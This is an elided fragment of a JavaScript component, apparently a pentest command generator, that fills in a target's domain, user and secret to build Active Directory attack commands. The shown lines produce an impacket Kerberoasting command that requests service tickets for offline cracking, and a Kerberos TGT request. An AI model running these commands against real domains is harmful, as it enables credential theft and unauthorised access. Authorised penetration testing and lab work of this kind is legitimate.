...
export default function CommandCalculator() {
  ...
  const SUBNET = f.ip ? f.ip.split(".").slice(0, 3).join(".") + ".0/24" : "<SUBNET>/24";
      ...
      name: "AD Attacks", groups: [
        ...
        { phase: "Roasting", cmds: [
          ...
          { label: "Kerberoast (impacket)", cmd: authMode === "krb"
            ...
            : `impacket-GetUserSPNs ${D}/${U}:'${SEC}' -dc-ip ${DCIP} -request -outputfile tgs.txt` },
      ...
      name: "Kerberos", groups: [
        { phase: "Tickets", cmds: [
          { label: "Request TGT", cmd: authMode === "hash"
            ...
            : `impacket-getTGT ${D}/${U}:'${SEC}' -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
  ...
  }), [authMode, f, baseDN, NB, SUBNET, hostsLine, IP, DCIP, HOST, D, U, SEC, LHOST, LPORT, TH, ldapAuth, winrmAuth]);
